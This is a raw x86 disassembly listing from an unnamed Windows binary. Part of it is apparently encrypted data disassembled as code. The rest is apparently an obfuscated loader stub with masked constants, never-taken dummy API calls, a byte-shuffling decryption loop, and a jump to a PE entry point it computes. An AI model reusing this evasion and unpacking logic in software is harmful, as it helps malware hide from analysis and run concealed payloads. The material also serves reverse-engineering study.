  422516:	test   al,0x4a
  422518:	adc    ebp,DWORD PTR [edx+ebx*4+0x7b]
  42251c:	dec    ecx
  42251d:	in     al,0x7c
  42251f:	push   ebx
  422520:	xor    DWORD PTR [edi+ebx*2-0x1e],edx
  422524:	mov    ecx,0xfbefb94c
  422529:	sub    BYTE PTR ds:0x7aad05a9,ch
  42252f:	icebp  
  422530:	mov    ecx,ds
  422532:	lahf   
  422533:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422534:	add    dl,BYTE PTR [edi+0x2409528f]
  42253a:	cmp    eax,0x7868dda7
  42253f:	jbe    0x422511
  422541:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422542:	ret    
  422543:	xchg   ebp,eax
  422544:	(bad)  
  422545:	out    dx,eax
  422546:	sbb    esp,DWORD PTR [edi-0x71]
  422549:	xor    ebp,DWORD PTR [edx+0x4a]
  42254c:	xchg   DWORD PTR [edi-0x1],eax
  42254f:	ins    BYTE PTR es:[edi],dx
  422550:	xor    esp,edx
  422552:	pop    ss
  422553:	mov    eax,ds:0x8470ae87
  422558:	adc    eax,0xbf77979d
  42255d:	mov    ebx,0x48dd8567
  422562:	xchg   ecx,eax
  422563:	std    
  422564:	pop    esi
  422565:	push   es
  422566:	sbb    BYTE PTR ds:0x54bfed48,0x7c
  42256d:	mov    eax,0xe5564ddc
  422572:	(bad)  
  422573:	xor    al,0xd8
  422575:	jle    0x4225b7
  422577:	mov    eax,0xdf137d2c
  42257c:	add    eax,0xcc15d7df
  422581:	dec    eax
  422582:	mul    BYTE PTR [ebp-0x531ea79]
  422588:	lods   eax,DWORD PTR ds:[esi]
  422589:	push   edi
  42258a:	mov    ss,WORD PTR [ebx-0x71]
  42258d:	pop    edx
  42258e:	mov    ds:0x808291c8,al
  422593:	dec    edx
  422594:	cmp    al,bh
  422596:	(bad)  
  422597:	icebp  
  422598:	test   eax,0x7e9807ac
  42259d:	add    ch,bl
  42259f:	add    al,0xf8
  4225a1:	gs dec eax
  4225a3:	push   esi
  4225a4:	dec    ecx
  4225a5:	dec    edi
  4225a6:	(bad)  
  4225a7:	enter  0xdd75,0xe8
  4225ab:	mov    ecx,cs
  4225ad:	push   0xffffffd0
  4225af:	pop    esp
  4225b0:	add    bl,dl
  4225b2:	cs push esp
  4225b4:	ror    DWORD PTR [ebp-0x5e],cl
  4225b7:	sbb    DWORD PTR [ebp+0x2d],0x727775f
  4225be:	call   0xaa121d51
  4225c3:	aad    0x9b
  4225c5:	loopne 0x42255b
  4225c7:	cli    
  4225c8:	sub    ah,ah
  4225ca:	xchg   edi,eax
  4225cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4225cc:	inc    edx
  4225cd:	mov    DWORD PTR ds:0xc0c7163a,edi
  4225d3:	int    0xa2
  4225d5:	jl     0x422616
  4225d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225d8:	pop    ds
  4225d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225da:	mov    al,ds:0xc26f664a
  4225df:	xchg   edi,eax
  4225e0:	out    dx,eax
  4225e1:	cmc    
  4225e2:	fsub   QWORD PTR [esi+0x315e537e]
  4225e8:	mov    al,ds:0x50cafcef
  4225ed:	inc    eax
  4225ee:	jmp    0x18a3a995
  4225f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4225f4:	std    
  4225f5:	lds    ebp,FWORD PTR [ecx-0x39e8b623]
  4225fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225fc:	into   
  4225fd:	cmp    BYTE PTR ds:0x33f04813,ah
  422603:	mov    ebx,0x104ac474
  422608:	xchg   BYTE PTR ds:0xaf5ac854,dl
  42260e:	fcom   DWORD PTR [eax-0x1b97ef76]
  422614:	into   
  422615:	cli    
  422616:	mov    edi,0x3731d292
  42261b:	es aas 
  42261d:	lahf   
  42261e:	pop    ebx
  42261f:	shl    DWORD PTR [edi+0x13],cl
  422622:	hlt    
  422623:	pop    ebp
  422624:	or     BYTE PTR [edx+0x7f],0xc8
  422628:	adc    eax,0xa810081e
  42262d:	inc    edx
  42262e:	cdq    
  42262f:	test   eax,0x66950d82
  422634:	sbb    eax,edx
  422636:	and    eax,0xc4b87a50
  42263b:	pop    ss
  42263c:	and    eax,0x479b8810
  422641:	jb     0x42268a
  422643:	mov    ch,BYTE PTR [edx-0x7d56770f]
  422649:	push   ss
  42264a:	arpl   sp,sp
  42264c:	inc    edi
  42264d:	loopne 0x4225f0
  42264f:	ret    0x103c
  422652:	les    ecx,FWORD PTR gs:[esi]
  422655:	(bad)  
  422656:	je     0x422673
  422658:	mov    esi,0xa01ca87
  42265d:	stos   BYTE PTR es:[edi],al
  42265e:	das    
  42265f:	jmp    DWORD PTR [edi+0x46]
  422662:	adc    DWORD PTR [ebp-0x18],ecx
  422665:	and    edx,DWORD PTR [edx]
  422667:	(bad)  
  422668:	push   eax
  422669:	addr16 pop eax
  42266b:	push   edx
  42266c:	inc    ecx
  42266d:	jmp    0x7541:0xd4e692f7
  422674:	sub    DWORD PTR [esi],eax
  422676:	push   esi
  422677:	pop    esp
  422678:	sbb    DWORD PTR [ebp-0x4a09386],eax
  42267e:	xchg   ecx,eax
  42267f:	jmp    0x29f8:0x5bc2f189
  422686:	cmp    ch,BYTE PTR [ebp-0x4062c923]
  42268c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42268d:	adc    dl,BYTE PTR [eax]
  42268f:	je     0x42262a
  422691:	mov    WORD PTR [edx],?
  422693:	test   eax,0x9d820a9f
  422698:	inc    edi
  422699:	or     eax,0x9f74f460
  42269e:	jmp    0x422693
  4226a0:	mov    eax,DWORD PTR [eax-0x2c62bcf1]
  4226a6:	(bad)  
  4226a7:	xor    cl,ah
  4226a9:	xor    al,0x3f
  4226ab:	and    dl,BYTE PTR ds:0x8d4669c0
  4226b1:	in     al,0x33
  4226b3:	jp     0x4226d9
  4226b5:	add    BYTE PTR [esi-0x5dcd0c72],cl
  4226bb:	sbb    ebp,DWORD PTR [edi-0x1d]
  4226be:	cdq    
  4226bf:	js     0x422740
  4226c1:	idiv   cl
  4226c3:	(bad)  
  4226c4:	sbb    eax,0xa6eca508
  4226c9:	sub    ebx,esi
  4226cb:	mov    eax,ds:0x7d6a4860
  4226d0:	pop    ecx
  4226d1:	jb     0x4226c6
  4226d3:	adc    BYTE PTR [eax-0x58],ch
  4226d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226d7:	aam    0x7d
  4226d9:	daa    
  4226da:	mov    dh,0x1a
  4226dc:	jns    0x42266f
  4226de:	mov    eax,0xee4efb98
  4226e3:	dec    eax
  4226e4:	lods   al,BYTE PTR ds:[esi]
  4226e5:	call   DWORD PTR [ebx]
  4226e7:	jg     0x4226a5
  4226e9:	stos   DWORD PTR es:[edi],eax
  4226ea:	aaa    
  4226eb:	popf   
  4226ec:	ds retf 0xcdc3
  4226f0:	inc    edx
  4226f1:	cmp    ecx,eax
  4226f3:	scas   al,BYTE PTR es:[edi]
  4226f4:	jmp    0x422712
  4226f6:	ror    DWORD PTR [edx],1
  4226f8:	in     eax,0xab
  4226fa:	push   ecx
  4226fb:	pop    esp
  4226fc:	nop
  4226fd:	xor    BYTE PTR [esi+0x31403ce],al
  422703:	mov    esi,0xa9432386
  422708:	pop    ds
  422709:	pop    ss
  42270a:	pop    esi
  42270b:	xchg   ebx,eax
  42270c:	call   FWORD PTR [ebp+0x2ca91b30]
  422712:	jl     0x422776
  422714:	mov    esi,0x559b5007
  422719:	pop    ss
  42271a:	aam    0xd9
  42271c:	push   cs
  42271d:	inc    eax
  42271e:	cmp    DWORD PTR [eax+0x7f3a2b74],ecx
  422724:	inc    esp
  422725:	test   BYTE PTR [ecx+0x79],0xd6
  422729:	retf   
  42272a:	inc    eax
  42272b:	and    edx,DWORD PTR [esi-0x11]
  42272e:	popa   
  42272f:	ins    DWORD PTR es:[edi],dx
  422730:	jne    0x422715
  422732:	sub    eax,0x6bf1b5e1
  422737:	dec    esp
  422738:	outs   dx,DWORD PTR ds:[esi]
  422739:	xchg   esp,eax
  42273a:	adc    BYTE PTR [edx-0x30],bh
  42273d:	ficom  DWORD PTR [edi]
  42273f:	adc    dl,dl
  422741:	sub    esi,edi
  422743:	icebp  
  422744:	adc    ecx,DWORD PTR [ecx]
  422746:	and    ah,BYTE PTR [edi]
  422748:	mov    ebp,0xf554a7b4
  42274d:	or     DWORD PTR [esi+0x1edf9352],edi
  422753:	ror    BYTE PTR [edi+ebp*4+0x18775a48],0x67
  42275b:	cmp    bh,BYTE PTR [edi+ebp*1]
  42275e:	cmp    eax,0x1b25bb9
  422763:	fmul   QWORD PTR [edx]
  422765:	fdiv   st,st(5)
  422767:	loopne 0x42275b
  422769:	add    al,0xdf
  42276b:	adc    DWORD PTR [ecx+eax*2-0x3e5d29c8],edx
  422772:	inc    ecx
  422773:	mov    ebp,0xf39cdb46
  422778:	mov    al,0x27
  42277a:	in     al,dx
  42277b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42277c:	xor    dl,bh
  42277e:	cmc    
  42277f:	test   al,0xb6
  422781:	pop    ebp
  422782:	sbb    DWORD PTR [edi],ecx
  422784:	jmp    0x42278e
  422786:	xchg   ebp,eax
  422787:	gs lahf 
  422789:	or     al,0xb7
  42278b:	test   eax,0xaf4f4880
  422790:	add    edi,DWORD PTR [edi+0x23d30965]
  422796:	jmp    0x422779
  422798:	jb     0x4227df
  42279a:	int3   
  42279b:	popa   
  42279c:	ins    BYTE PTR es:[edi],dx
  42279d:	push   cs
  42279e:	(bad)  
  42279f:	ins    DWORD PTR es:[edi],dx
  4227a0:	or     edx,DWORD PTR [edi+0x21]
  4227a3:	stos   BYTE PTR es:[edi],al
  4227a4:	in     eax,dx
  4227a5:	test   edi,esp
  4227a7:	hlt    
  4227a8:	mov    ch,0xc0
  4227aa:	pop    ecx
  4227ab:	int3   
  4227ac:	shl    BYTE PTR [eax+ebx*1+0x47946d26],cl
  4227b3:	xor    eax,0xa9338c6f
  4227b8:	rcr    BYTE PTR ds:0x49df5d2d,cl
  4227be:	lahf   
  4227bf:	xlat   BYTE PTR ds:[ebx]
  4227c0:	int    0x8d
  4227c2:	push   eax
  4227c3:	or     BYTE PTR [edi+0x17c74279],al
  4227c9:	mov    dh,0x76
  4227cb:	push   ebp
  4227cc:	idiv   DWORD PTR [ebp-0x37]
  4227cf:	xchg   BYTE PTR [ecx],bl
  4227d1:	xchg   dl,ah
  4227d3:	call   0xa80d8353
  4227d8:	mov    bl,0x7a
  4227da:	pop    edi
  4227db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4227dc:	cmp    BYTE PTR [esi+0x44d8a1c9],bl
  4227e2:	jl     0x42281a
  4227e4:	fisubr WORD PTR ds:0x7f756954
  4227ea:	xor    eax,0x72626ddc
  4227ef:	clc    
  4227f0:	jmp    0x1da59cf6
  4227f5:	fsubr  DWORD PTR [ebx+0x28]
  4227f8:	inc    esp
  4227f9:	cwde   
  4227fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4227fb:	jno    0x422823
  4227fd:	and    BYTE PTR [edi+0x5f],cl
  422800:	adc    al,0xe8
  422802:	adc    BYTE PTR [ebp+0x54],0xd
  422806:	imul   ebp,eax,0x1f13c67a
  42280c:	rol    BYTE PTR [ecx+ebp*4-0x40],0x25
  422811:	aad    0x81
  422813:	outs   dx,DWORD PTR ds:[esi]
  422814:	outs   dx,BYTE PTR ds:[esi]
  422815:	hlt    
  422816:	in     eax,0xea
  422818:	mov    edx,fs
  42281a:	iret   
  42281b:	shl    DWORD PTR [esi+esi*1+0x19],1
  42281f:	jae    0x4227b2
  422821:	push   eax
  422822:	jae    0x4227bd
  422824:	mov    al,0x25
  422826:	mov    edi,DWORD PTR ds:0xc4d7a425
  42282c:	data16 or al,0x23
  42282f:	stos   BYTE PTR es:[edi],al
  422830:	mov    bl,0xe0
  422832:	cmp    DWORD PTR [edx+0x34],ebp
  422835:	outs   dx,DWORD PTR ds:[esi]
  422836:	xor    ah,ch
  422838:	sti    
  422839:	inc    esi
  42283a:	push   eax
  42283b:	call   0xc3d1:0xce6ec536
  422842:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422843:	fstp   QWORD PTR [ebx+0x6ada60f9]
  422849:	dec    ebx
  42284a:	xchg   edi,eax
  42284b:	mov    eax,ds:0x429c4c58
  422850:	add    DWORD PTR [ecx-0x15d41dd3],ecx
  422856:	pop    edi
  422857:	or     ch,BYTE PTR [ebp-0x2b]
  42285a:	pop    ecx
  42285b:	scas   al,BYTE PTR es:[edi]
  42285c:	pop    ebx
  42285d:	pop    ss
  42285e:	mov    edi,DWORD PTR [ebx-0x8311339]
  422864:	mov    BYTE PTR [ebx+ecx*4+0x55],dh
  422868:	int3   
  422869:	jmp    0x4228c5
  42286e:	mov    edx,DWORD PTR [ebp-0x3c]
  422871:	mov    edi,DWORD PTR [ebp-0x4]
  422874:	xor    edx,eax
  422876:	xor    edi,eax
  422878:	add    edx,ecx
  42287a:	add    edi,ecx
  42287c:	jmp    0x4228ac
  422881:	(bad)
  422884:	rcr    dl,1
  422886:	fcmovnb st,st(5)
  422888:	rcl    DWORD PTR [edi],1
  42288a:	fdiv   st,st(0)
  42288c:	mov    BYTE PTR [ebp-0x49],ah
  42288f:	lods   al,BYTE PTR ds:[esi]
  422890:	xchg   DWORD PTR [edx+0x7f],edx
  422893:	jle    0x42290d
  422895:	or     eax,0x16787878
  42289a:	pop    ds
  42289b:	std    
  42289c:	jmp    0x4228d8
  42289e:	ds xchg esi,eax
  4228a0:	pop    es
  4228a1:	(bad)  
  4228a2:	in     eax,0x6d
  4228a4:	hlt    
  4228a5:	xor    BYTE PTR [ebp+0x1e1e5434],cl
  4228ab:	add    BYTE PTR [edi],cl
  4228ad:	scas   eax,DWORD PTR es:[edi]
  4228ae:	xlat   BYTE PTR ds:[ebx]
  4228af:	mov    edi,DWORD PTR [ebp-0x8]
  4228b2:	mov    ebx,DWORD PTR [ebp-0x10]
  4228b5:	sub    ebx,edi
  4228b7:	cmp    ebx,edx
  4228b9:	mov    edx,DWORD PTR [ebp-0x38]
  4228bc:	jbe    0x4228c5
  4228c2:	mov    edx,DWORD PTR [ebp-0x3c]
  4228c5:	mov    edi,DWORD PTR [ebp-0x4]
  4228c8:	xor    edi,eax
  4228ca:	xor    edx,eax
  4228cc:	add    edi,ecx
  4228ce:	add    edx,ecx
  4228d0:	imul   edx,edi
  4228d3:	mov    DWORD PTR [ebp+0xc],edx
  4228d6:	mov    edx,DWORD PTR [ebp+0xc]
  4228d9:	mov    DWORD PTR [ebp-0x24],edx
  4228dc:	mov    edx,DWORD PTR [ebp-0x8]
  4228df:	add    edx,DWORD PTR [ebp-0x40]
  4228e2:	mov    DWORD PTR [ebp-0x18],0xf89c8538
  4228e9:	mov    DWORD PTR [ebp-0x1c],edx
  4228ec:	mov    DWORD PTR [ebp-0xc],0xf89c8539
  4228f3:	mov    DWORD PTR [ebp-0x44],0xf89c853a
  4228fa:	mov    edx,DWORD PTR [ebp-0x18]
  4228fd:	xor    edx,eax
  4228ff:	add    edx,ecx
  422901:	jmp    0x42296e
  422906:	mov    edx,DWORD PTR [ebp-0x18]
  422909:	xor    edx,eax
  42290b:	add    edx,DWORD PTR [ebp-0x14]
  42290e:	mov    edi,DWORD PTR [ebp-0x1c]
  422911:	mov    dl,BYTE PTR [edx+edi*1+0x327298]
  422918:	mov    BYTE PTR [ebp+0xf],dl
  42291b:	mov    edx,DWORD PTR [ebp-0xc]
  42291e:	xor    edx,eax
  422920:	add    edx,DWORD PTR [ebp-0x14]
  422923:	mov    edi,DWORD PTR [ebp-0x1c]
  422926:	mov    dl,BYTE PTR [edx+edi*1+0x327298]
  42292d:	mov    BYTE PTR [ebp+0xb],dl
  422930:	mov    dl,BYTE PTR [ebp+0xf]
  422933:	mov    edi,DWORD PTR [ebp-0xc]
  422936:	xor    edi,eax
  422938:	add    edi,DWORD PTR [ebp-0x14]
  42293b:	mov    ebx,DWORD PTR [ebp-0x1c]
  42293e:	mov    BYTE PTR [edi+ebx*1+0x327298],dl
  422945:	mov    dl,BYTE PTR [ebp+0xb]
  422948:	mov    edi,DWORD PTR [ebp-0x18]
  42294b:	xor    edi,eax
  42294d:	add    edi,DWORD PTR [ebp-0x14]
  422950:	mov    ebx,DWORD PTR [ebp-0x1c]
  422953:	mov    BYTE PTR [edi+ebx*1+0x327298],dl
  42295a:	mov    edx,DWORD PTR [ebp-0x44]
  42295d:	mov    edi,DWORD PTR [ebp-0xc]
  422960:	xor    edx,eax
  422962:	xor    edi,eax
  422964:	add    edx,ecx
  422966:	add    edi,ecx
  422968:	imul   edx,edi
  42296b:	add    edx,DWORD PTR [ebp-0x14]
  42296e:	mov    DWORD PTR [ebp-0x14],edx
  422971:	mov    edx,DWORD PTR [ebp-0xc]
  422974:	mov    edi,DWORD PTR [ebp-0x24]
  422977:	xor    edx,eax
  422979:	add    edx,ecx
  42297b:	imul   edx,edi
  42297e:	mov    edi,DWORD PTR [ebp-0xc]
  422981:	xor    edi,eax
  422983:	sub    edx,edi
  422985:	mov    edi,DWORD PTR [ebp-0xc]
  422988:	mov    ebx,DWORD PTR [ebp-0x14]
  42298b:	xor    edi,eax
  42298d:	add    edi,ecx
  42298f:	imul   edi,ebx
  422992:	mov    ebx,DWORD PTR [ebp-0x18]
  422995:	xor    ebx,eax
  422997:	sub    edx,ecx
  422999:	lea    edi,[edi+ebx*1+0x327298]
  4229a0:	cmp    edi,edx
  4229a2:	jbe    0x422906
  4229a8:	mov    edx,DWORD PTR [ebp-0xc]
  4229ab:	mov    edi,DWORD PTR [ebp-0x24]
  4229ae:	xor    edx,eax
  4229b0:	add    edx,ecx
  4229b2:	imul   edx,edi
  4229b5:	mov    edi,DWORD PTR [ebp-0x18]
  4229b8:	xor    edi,eax
  4229ba:	add    edx,edi
  4229bc:	mov    edi,DWORD PTR [ebp-0x8]
  4229bf:	lea    edx,[edx+edi*1+0x327298]
  4229c6:	mov    DWORD PTR [ebp-0x8],edx
  4229c9:	mov    edx,DWORD PTR [ebp-0x20]
  4229cc:	xor    edx,eax
  4229ce:	mov    edi,0xffcd8d68
  4229d3:	sub    edi,edx
  4229d5:	add    edi,DWORD PTR [ebp-0x10]
  4229d8:	mov    edx,DWORD PTR [ebp-0x20]
  4229db:	mov    ebx,DWORD PTR [ebp-0x8]
  4229de:	xor    edx,eax
  4229e0:	add    edx,ecx
  4229e2:	imul   edx,ebx
  4229e5:	cmp    edx,edi
  4229e7:	jbe    0x41a739
  4229ed:	pop    ebx
  4229ee:	pop    edi
  4229ef:	leave  
  4229f0:	ret    0x8
  4229f3:	push   ebp
  4229f4:	mov    ebp,esp
  4229f6:	push   ecx
  4229f7:	mov    ecx,DWORD PTR [ebp+0x8]
  4229fa:	mov    eax,0x7510850
  4229ff:	xor    ecx,eax
  422a01:	adc    DWORD PTR ds:0x42a321,0x62
  422a0b:	add    ecx,0x327298
  422a11:	mov    DWORD PTR [ebp+0x10],ecx
  422a14:	mov    ecx,0x3ff3
  422a19:	mov    DWORD PTR [ebp+0x8],0xf34cebc
  422a20:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  422a27:	mov    ecx,0xf89c8539
  422a2c:	push   esi
  422a2d:	mov    DWORD PTR [ebp+0x10],0x70019fa
  422a34:	mov    DWORD PTR ds:0x42a321,0x2038
  422a3e:	mov    esi,DWORD PTR [ebp-0x4]
  422a41:	mov    DWORD PTR ds:0x42a2dd,0x2b16
  422a4b:	cmp    ecx,esi
  422a4d:	mov    DWORD PTR ds:0x42a2c5,0x385
  422a57:	je     0x422abb
  422a5d:	dec    esi
  422a5e:	mov    esi,DWORD PTR [ebp+0xc]
  422a61:	adc    DWORD PTR ds:0x42a2c9,0x2ac0
  422a6b:	xor    ecx,eax
  422a6d:	add    DWORD PTR ds:0x42a3ed,0x42a325
  422a77:	xor    esi,eax
  422a79:	sub    DWORD PTR ds:0x42a31d,0x42a351
  422a83:	lea    ecx,[esi+ecx*1+0x327298]
  422a8a:	sub    DWORD PTR ds:0x42a391,0x25a4
  422a94:	xor    ecx,eax
  422a96:	mov    DWORD PTR ds:0x42a3e9,0x18df
  422aa0:	cmp    ecx,0xf89c8528
  422aa6:	jne    0x422a2d
  422aac:	mov    DWORD PTR ds:0x42a2e1,0x7006
  422ab6:	jmp    0x422b33
  422abb:	mov    esi,DWORD PTR ds:0x42a3cd
  422ac1:	mov    esi,DWORD PTR [esi]
  422ac3:	xor    DWORD PTR ds:0x42a2d5,esi
  422ac9:	add    ecx,0xffcd8d68
  422acf:	mov    esi,DWORD PTR ds:0x42a359
  422ad5:	and    esi,DWORD PTR ds:0x42a2dd
  422adb:	mov    DWORD PTR ds:0x42a359,esi
  422ae1:	mov    esi,ecx
  422ae3:	adc    DWORD PTR ds:0x42a2e1,0x42a2d5
  422aed:	xor    esi,eax
  422aef:	add    esi,DWORD PTR [ebp+0x8]
  422af2:	sbb    DWORD PTR ds:0x42a365,0x42a399
  422afc:	mov    DWORD PTR [ebp+0x8],esi
  422aff:	mov    esi,DWORD PTR ds:0x42a351
  422b05:	or     DWORD PTR ds:0x42a35d,esi
  422b0b:	mov    esi,DWORD PTR [ebp+0x8]
  422b0e:	or     DWORD PTR ds:0x42a3ed,0x42a3e1
  422b18:	xor    esi,ecx
  422b1a:	xor    esi,eax
  422b1c:	mov    eax,DWORD PTR [edx+0x194]
  422b22:	mov    ecx,DWORD PTR [eax]
  422b24:	mov    eax,DWORD PTR [ecx+0x3c]
  422b27:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  422b2b:	add    eax,ecx
  422b2d:	mov    DWORD PTR [ebp+0x8],esi
  422b30:	mov    DWORD PTR [ebp+0x10],eax
  422b33:	mov    eax,DWORD PTR [ebp+0x10]
  422b36:	pop    esi
  422b37:	test   eax,eax
  422b39:	je     0x422b5d
  422b3f:	push   DWORD PTR ds:0x426b9a
  422b45:	push   DWORD PTR ds:0x426946
  422b4b:	mov    eax,DWORD PTR [edx+0x194]
  422b51:	push   DWORD PTR [eax]
  422b53:	mov    eax,DWORD PTR [ebp+0x10]
  422b56:	call   eax
  422b58:	jmp    0x422b60
  422b5d:	mov    eax,DWORD PTR [ebp+0x10]
  422b60:	leave  
  422b61:	ret    0xc
  422b64:	push   ebp
  422b65:	mov    ebp,esp
  422b67:	sub    esp,0x40
  422b6a:	sbb    DWORD PTR ds:0x42a3a1,ebx
  422b70:	push   ebx
  422b71:	and    DWORD PTR ds:0x42a2c1,0x0
  422b7b:	mov    ecx,DWORD PTR ds:0x42a2c1
  422b81:	inc    ecx
  422b82:	mov    DWORD PTR ds:0x42a2c1,ecx
  422b88:	cmp    DWORD PTR ds:0x42a2c1,0x10
  422b8f:	jne    0x422bce
  422b95:	push   DWORD PTR [ebp-0x28]
  422b98:	push   DWORD PTR [ebp-0x18]
  422b9b:	push   DWORD PTR [ebp-0x14]
  422b9e:	push   0x306f
  422ba3:	push   DWORD PTR [ebp-0x18]
  422ba6:	push   0x1d07
  422bab:	push   DWORD PTR [ebp-0x24]
  422bae:	push   0x5967
  422bb3:	push   DWORD PTR [ebp-0x28]
  422bb6:	push   0x32c4
  422bbb:	push   0x1f22
  422bc0:	push   0x72e0
  422bc5:	push   DWORD PTR [ebp-0x24]
  422bc8:	call   DWORD PTR ds:0x425008
  422bce:	cmp    DWORD PTR ds:0x42a2c1,0xf
  422bd5:	jne    0x422be8
  422bdb:	mov    ecx,DWORD PTR ds:0x42a2c1
  422be1:	inc    ecx
  422be2:	mov    DWORD PTR ds:0x42a2c1,ecx
  422be8:	cmp    DWORD PTR ds:0x42a2c1,0x1f
  422bef:	jb     0x422b7b
  422bf5:	add    DWORD PTR ds:0x42a2d9,0x3d7
  422bff:	push   esi
  422c00:	and    DWORD PTR ds:0x42a369,0x0
  422c0a:	xor    ecx,ecx
  422c0c:	add    ecx,DWORD PTR ds:0x42a369
  422c12:	inc    ecx
  422c13:	mov    DWORD PTR ds:0x42a369,ecx
  422c19:	cmp    DWORD PTR ds:0x42a369,0xb
  422c20:	jne    0x422c39
  422c26:	push   DWORD PTR [ebp-0x18]
  422c29:	push   0x23c4
  422c2e:	push   0x7367
  422c33:	call   DWORD PTR ds:0x42500c
  422c39:	cmp    DWORD PTR ds:0x42a369,0xa
  422c40:	jne    0x422c53
  422c46:	mov    ecx,DWORD PTR ds:0x42a369
  422c4c:	inc    ecx
  422c4d:	mov    DWORD PTR ds:0x42a369,ecx
  422c53:	cmp    DWORD PTR ds:0x42a369,0x13
  422c5a:	jb     0x422c0a
  422c60:	push   edi
  422c61:	sub    ecx,DWORD PTR ds:0x42a2d5
  422c67:	lea    eax,ds:0x426c1e
  422c6d:	push   eax
  422c6e:	push   DWORD PTR ds:0x426c1a
  422c74:	not    ecx
  422c76:	push   0x0
  422c78:	lea    eax,ds:0x42525c
  422c7e:	inc    eax
  422c7f:	inc    eax
  422c80:	and    DWORD PTR ds:0x42a36d,0x0
  422c8a:	xor    ecx,ecx
  422c8c:	xor    ecx,DWORD PTR ds:0x42a36d
  422c92:	inc    ecx
  422c93:	mov    DWORD PTR ds:0x42a36d,ecx
  422c99:	cmp    DWORD PTR ds:0x42a36d,0x1d
  422ca0:	jne    0x422cbb
  422ca6:	push   0x42a5a5
  422cab:	push   0x42a549
  422cb0:	push   0x400000
  422cb5:	call   DWORD PTR ds:0x4251e8
  422cbb:	cmp    DWORD PTR ds:0x42a36d,0x13
  422cc2:	jb     0x422c8a
  422cc8:	and    DWORD PTR ds:0x42a3e1,0x0
  422cd2:	xor    ecx,ecx
  422cd4:	or     ecx,DWORD PTR ds:0x42a3e1
  422cda:	inc    ecx
  422cdb:	mov    DWORD PTR ds:0x42a3e1,ecx
  422ce1:	cmp    DWORD PTR ds:0x42a3e1,0x9
  422ce8:	jne    0x422d04
  422cee:	push   0x4ac4
  422cf3:	push   DWORD PTR [ebp-0x1c]
  422cf6:	push   0x42a55d
  422cfb:	push   DWORD PTR [ebp-0x28]
  422cfe:	call   DWORD PTR ds:0x425010
  422d04:	cmp    DWORD PTR ds:0x42a3e1,0x8
  422d0b:	jne    0x422d1e
  422d11:	mov    ecx,DWORD PTR ds:0x42a3e1
  422d17:	inc    ecx
  422d18:	mov    DWORD PTR ds:0x42a3e1,ecx
  422d1e:	cmp    DWORD PTR ds:0x42a3e1,0x11
  422d25:	jb     0x422cd2
  422d2b:	mov    DWORD PTR ds:0x42a2d1,0x19
  422d35:	cmp    DWORD PTR ds:0x42a2d1,0x0
  422d3c:	je     0x422d72
  422d42:	cmp    DWORD PTR ds:0x42a2d1,0x28
  422d49:	jne    0x422d5a
  422d4f:	push   0x48e8
  422d54:	call   DWORD PTR ds:0x4251ec
  422d5a:	mov    ecx,DWORD PTR ds:0x42a2d1
  422d60:	dec    ecx
  422d61:	mov    DWORD PTR ds:0x42a2d1,ecx
  422d67:	jmp    0x422d35
  422d6c:	adc    ecx,DWORD PTR ds:0x42a3d5
  422d72:	push   0x0
  422d74:	pop    ecx
  422d75:	sub    DWORD PTR ds:0x42a311,0x4325
  422d7f:	xor    ecx,DWORD PTR [eax-0x2]
  422d82:	adc    DWORD PTR ds:0x42a2c9,0x42a355
  422d8c:	call   ecx
  422d8e:	cmp    DWORD PTR ds:0x426c1e,0x7175fa8e
  422d98:	jne    0x422db0
  422d9e:	xor    eax,eax
  422da0:	mov    DWORD PTR ds:0x42a32d,0x6b63
  422daa:	inc    eax
  422dab:	jmp    0x423225
  422db0:	sub    DWORD PTR ds:0x42a315,ecx
  422db6:	mov    DWORD PTR [ebp-0x8],0xf89c8538
  422dbd:	adc    ebx,ecx
  422dbf:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  422dc6:	lea    eax,[ebp-0x20]
  422dc9:	xor    edi,DWORD PTR ds:0x42a32d
  422dcf:	mov    DWORD PTR [ebp-0x38],eax
  422dd2:	lea    eax,[ebp-0x1c]
  422dd5:	mov    DWORD PTR [ebp-0x28],eax
  422dd8:	sub    DWORD PTR ds:0x42a2b9,0x6262
  422de2:	mov    eax,ds:0x426ac2
  422de7:	mov    edi,DWORD PTR ds:0x42a3e5
  422ded:	sub    DWORD PTR ds:0x42a32d,edi
  422df3:	mov    eax,DWORD PTR [eax+0x1c8]
  422df9:	mov    eax,DWORD PTR [eax]
  422dfb:	xor    DWORD PTR ds:0x42a2e1,ecx
  422e01:	mov    ecx,DWORD PTR [ebp-0x28]
  422e04:	and    DWORD PTR ds:0x42a3a1,0x0
  422e0e:	jmp    0x422e22
  422e13:	xor    edi,edi
  422e15:	or     edi,DWORD PTR ds:0x42a3a1
  422e1b:	inc    edi
  422e1c:	mov    DWORD PTR ds:0x42a3a1,edi
  422e22:	cmp    DWORD PTR ds:0x42a3a1,0x12
  422e29:	jae    0x422efe
  422e2f:	cmp    DWORD PTR ds:0x42a3a1,0xc
  422e36:	jne    0x422e4c
  422e3c:	push   0x42a4a5
  422e41:	push   0x400000
  422e46:	call   DWORD PTR ds:0x425028
  422e4c:	cmp    DWORD PTR ds:0x42a3a1,0xb
  422e53:	jne    0x422e68
  422e59:	xor    edi,edi
  422e5b:	or     edi,DWORD PTR ds:0x42a3a1
  422e61:	inc    edi
  422e62:	mov    DWORD PTR ds:0x42a3a1,edi
  422e68:	jmp    0x422e13
  422e6d:	and    DWORD PTR ds:0x42a3e9,0x0
  422e77:	mov    ebx,DWORD PTR ds:0x42a3e9
  422e7d:	inc    ebx
  422e7e:	mov    DWORD PTR ds:0x42a3e9,ebx
  422e84:	cmp    DWORD PTR ds:0x42a3e9,0x1b
